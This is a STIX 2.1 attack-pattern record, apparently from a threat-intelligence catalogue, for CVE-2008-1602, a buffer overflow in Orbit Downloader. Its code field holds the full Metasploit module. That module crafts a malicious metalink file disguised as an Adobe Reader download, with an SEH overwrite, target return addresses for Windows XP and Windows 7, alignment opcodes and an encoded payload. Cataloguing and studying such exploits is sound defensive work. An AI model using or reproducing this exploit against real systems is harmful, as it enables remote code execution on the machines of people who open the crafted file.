{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8d02e267-8c87-49aa-bdc8-d2e4b9dd6c00",
    "created": "2024-08-14T16:37:51.524812Z",
    "modified": "2024-08-14T16:37:51.524817Z",
    "name": "Orbit Downloader URL Unicode Conversion Overflow",
    "description": " This module exploits a stack-based buffer overflow in Orbit Downloader.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/orbit_download_failed_bof.rb",
            "external_id": "orbit_download_failed_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1602"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/orbit-downloader"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Orbit Downloader URL Unicode Conversion Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Orbit Downloader.\n        The vulnerability is due to Orbit converting a URL ascii string to unicode\n        in an insecure way with MultiByteToWideChar.\n        The vulnerability is exploited with a specially crafted metalink file that\n        should be opened with Orbit through the \"File->Add Metalink...\" option.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Diego Juarez', # Vulnerability discovery\n          'juan vazquez', # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'BID', '28541' ],\n          [ 'OSVDB', '44036' ],\n          [ 'CVE', '2008-1602' ],\n          [ 'URL', 'http://www.coresecurity.com/content/orbit-downloader' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2000,\n          'EncoderType'\t=> Msf::Encoder::Type::AlphanumUnicodeMixed,\n          'EncoderOptions' => { 'BufferRegister' => 'EAX' },\n          'BadChars'    => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x26\\x3c\",\n          'DisableNops' => true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Orbit Downloader 6.4 on Windows XP SP3',\n            {\n              'Ret' => 0x4b38, # p/p/r unicode compatible from orbitdm.exe\n              'Nop' => 0x46, # 004600 => add [esi+0x0],al\n              'AddEax' => \"\\x05\\x15\\x11\", # add eax,0x11001500\n              'Offset' => 4\n            }\n          ],\n          [ 'Orbit Downloader 6.4 on Windows 7',\n            {\n              'Ret' => 0x4b38, # p/p/r unicode compatible from orbitdm.exe\n              'Nop' => 0x46, # 004600 => add [esi+0x0],al\n              'AddEax' => \"\\x05\\x16\\x11\", # add eax,0x11001600\n              'Offset' => 120\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2008-04-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.metalink']),\n      ])\n  end\n\n  def exploit\n\n    sploit = rand_text_alpha(4096 - \"http://\".length)\n    sploit << \"\\xff\" * 2 # EIP =>  Access Violation\n    sploit << rand_text_alpha(120) # padding\n    sploit << \"\\x61\\x62\" # NSEH # popad (61) + nop compatible with unicode (add [edx+0x0],ah # 006200)\n    sploit << [target.ret].pack(\"v\") # seh # ppr\n    sploit << target['Nop']\n    sploit << target['AddEax'] # eax align is os dependant\n    sploit << target['Nop']\n    sploit << \"\\x2d\\x11\\x11\" # sub eax,0x11001100\n    sploit << target['Nop']\n    sploit << \"\\x50\" # push eax\n    sploit << target['Nop']\n    sploit << \"\\xc3\" # ret\n    sploit << rand_text_alpha(target['Offset']) # align shellcode to eax pointer\n    sploit << payload.encoded\n\n    metalink = %Q|\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<metalink version=\"3.0\" generator=\"Metalink Generator v1.00.0034\" xmlns=\"http://www.metalinker.org/\">\n  <publisher>\n    <name>Adobe</name>\n    <url>http://www.adobe.com/</url>\n  </publisher>\n  <description>Adobe Acrobat Reader</description>\n  <files>\n    <file name=\"AdbeRdr80_en_US.exe\">\n      <version>8.0</version>\n      <language>en-US</language>\n      <os>Windows-x86</os>\n      <verification>\n        <hash type=\"md5\">0ab5ce309f313ed028824251c798b35c</hash>\n      </verification>\n      <resources>\n        <url type=\"http\" preference=\"100\">http://#{sploit}.com/pub/adobe/reader/win/8.x/8.0/enu/AdbeRdr80_en_US.exe</url>\n      </resources>\n    </file>\n  </files>\n</metalink>\n|\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(metalink)\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2008-04-03",
    "x_mitre_platforms": [
        "win'"
    ]
}